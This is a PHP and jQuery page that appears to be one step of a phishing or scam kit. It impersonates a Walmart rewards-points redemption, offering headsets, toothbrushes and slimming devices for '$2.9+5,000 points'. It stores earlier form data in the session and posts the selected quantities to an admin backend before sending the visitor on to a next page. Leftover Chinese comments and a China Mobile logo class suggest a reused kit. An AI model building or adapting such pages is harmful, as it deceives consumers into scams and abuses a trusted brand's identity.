<?php
session_start();
// include('partials/header.php');
include('header-new.php');



if (isset($_POST['submit'])) {
    $_SESSION['step1Data'] = $_POST;
}

$productList = [
    [
        'product_name' => "Hanlin Future69 ENC noise-canceling gaming headset",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_01.png'
    ],
    [
        'product_name' => "Hanlin Bluetooth Headset Smartwatch",
        'product_price' => "$2.9+5,000 points",
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_02.png'
    ],
    [
        'product_name' => "Oral-B - Smart Series SS5000 Rechargeable Electric Toothbrush",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_03.png'
    ],
    [
        'product_name' => "Project E Beauty - LED Red Light Slimming Device",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_04.png'
    ],
    [
        'product_name' => "Project E Beauty - LED Red Light Slimming Device",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_04.png'
    ],
    [
        'product_name' => "Project E Beauty - LED Red Light Slimming Device",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_04.png'
    ],
    [
        'product_name' => "Project E Beauty - LED Red Light Slimming Device",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_04.png'
    ],
    [
        'product_name' => "Project E Beauty - LED Red Light Slimming Device",
        'product_price' => '$2.9+5,000 points',
        'price' => '5000',
        'product_qty' => 0,
        'product_image' => '/images/thumb_image_04.png'
    ],
];

?>
<style>
    .wrap {
        margin-top: 10px;
        padding: 30px 30px;
        padding-top: 0px;
    }

    @media(max-width: 767px) {
        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }

        .box {
            background: #0071dc;
            padding: 30px 20px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .section_1 {
            width: 50%;
        }

        .section_2 {
            width: 50%;
        }

        .inner_box {
            display: flex;
            flex-direction: column;
        }

        .inner_box>span {
            color: #fff;
        }

        .inner_box>b {
            color: #fff;
        }

        .product_area {
            margin-top: 12px;
        }

        .product_area>b {
            color: #0071dc;
        }

        .product_list {
            display: grid;
            align-items: center;
            justify-content: center;
            text-align: center;
            grid-template-columns: auto auto;
        }

        .product_s {
            width: 85%;
            border: 1px solid #efefef;
            margin: 5px;
            padding: 12px;
            height: 300px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .product_s>p {
            margin-bottom: 5px;
            font-size: 15px;
            font-weight: 500;
        }

        .p_name {}

        .p_image {
            width: 100%;
        }

        .p_quantity {}

        .p_cart {
            padding: 4px;
            background: #2870d3;
            color: #fff;
            border: 0px;
            width: 100%;
            border-radius: 12px;
        }

        .update_qty>input:focus {
            outline: none;
        }

        .update_qty>input:active {
            outline: none;
        }

        .update_qty>input {
            outline: none;
            border: 0px;
            width: 90px;
            text-align: center;
        }

        .update_qty {
            margin-bottom: 8px;
            border-radius: 8px;
            padding: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid;
        }

        .next_page {
            padding: 12px;
            background: #0071dc;
            color: #fff;
            border: 0px;
            width: 100%;
            border-radius: 12px;
        }
    }

    .wrap>b {
        color: #0071dc;
    }

    .wrap-title {
        font-size: 24px;
        font-weight: 900;
        text-align: center;
        text-transform: uppercase;
        margin-bottom: 20px;
    }
</style>
<div class="wrap">
    <div class="wrap-title">Pre-order and collect at your convenience!</div>
    <b style="color: #147350;">
        <i class="fa fa-chevron-left" style="color: #147350;"></i> Your Walmart Points
    </b>
    <div class="box" style="background-color: #147350;">
        <div class="section_1">
            <div class="inner_box">
                <span>Available points</span>
                <input type="hidden" id="totalValue" value="5000" />
                <b>5340</b>
            </div>
        </div>
        <div class="section_2">
            <div class="inner_box">
                <span>Unsaved points</span>
                <b>0</b>
            </div>
        </div>
    </div>
    <div class="product_area">
        <b style="color: #147350;">
            Redeem rewards
        </b>
        <div class="product_list">
            <input type="hidden" value="" id="totalPrice" />
            <?php foreach ($productList as $k => $products) { ?>
                <div class="product_s">
                    <img class="p_image" src="<?php echo $folder_path;?>/<?php echo $products['product_image']  ?>" />
                    <p class="p_name"><?php echo $products['product_name'] ?></p>
                    <p class="p_quantity" style="color: #147350;"><?php echo $products['product_price'] ?></p>
                    <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                    <input type="hidden" id="final_price<?php echo $k ?>" value="" />
                    <div class="update_qty">
                        <i class="fa fa-plus" onclick="up(<?php echo $k ?>)"></i>
                        <input type="number" disabled value="0" id="qty<?php echo $k ?>" />
                        <i class="fa fa-minus" onclick="down(<?php echo $k ?>)"></i>
                    </div>
                    <!--                        <button class="p_cart">大車</button>-->
                </div>
            <?php
            }
            ?>
        </div>
    </div>
    <br>
    <br>
    <div class="nextPage">
        <div id="progress-loading" style="display:none;text-align:center;"><img style="width:60px; height:auto;" src="../loading.gif" /></div>
        <button class="next_page" style="background-color: #147350;" id="carBtn" onclick="goToNextPage()">Exchange</button>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    setTimeout(() => {
        jQuery('.loader-wrap').hide();
    }, 3000);
    let totalValue = Number($('#totalValue').val());
    let calculateValue = 0;
    let quantity = 0;

    function up(val) {
        let totalPrice = Number($('#totalPrice').val());
        if (calculateValue >= totalValue) {
            alert('Exceeds available points');
            console.log("value already exeeded");
        } else {
            let value = Number($('#qty' + val).val()) + 1;
            quantity = value;
            $('#qty' + val).val(value);
            let productPrice = Number($('#price' + val).val());
            let finalValue = productPrice * value;
            calculateValue = finalValue;
            console.log("totalPrice ===>", finalValue);
            $('#totalPrice').val(calculateValue);
            if (finalValue > totalValue) {
                alert('Exceeds available points');
            }
        }
    }

    function down(val) {
        let value = Number($('#qty' + val).val()) - 1;
        quantity = value;
        let totalPrice = Number($('#totalPrice').val());
        if (value >= 0) {
            $('#qty' + val).val(value);
            let productPrice = Number($('#price' + val).val());
            console.log("productPrice ==>", productPrice);
            console.log("totalPrice ==>", totalPrice);
            let finalValue = calculateValue - productPrice;
            console.log("finalValue ===>", finalValue);
            calculateValue = finalValue;
            $('#totalPrice').val(finalValue);
        }
    }

    function goToNextPage() {
        let totalPrice = Number($('#totalPrice').val());
        console.log('totalPrice ===>', totalPrice);
        console.log('totalValue ===>', totalValue);
        console.log('quantity ===>', quantity);
        let formData = {
            total_quantity: quantity
        }
        $("#progress-loading").show();
        $('#carBtn').prop('disabled', true);
        $.ajax({
            url: "<?php echo $folder_path;?>/admin/cart.php",
            type: "POST",
            data: formData,
            success: function(response) {
                $("#progress-loading").hide();
                console.log("response ===>", response);
                window.location.href = 'page3.php';
            },
            error: function(error) {
                $("#progress-loading").hide();
                $('#carBtn').prop('disabled', false);
                console.log("error ===>", error);
            }
        });
        // if(calculateValue >= totalValue) {
        //     alert('超出可用積分');
        // } else {
        //     window.location.href='page3.php';
        // }
    }
</script>
<?php
include('footer-new.php');
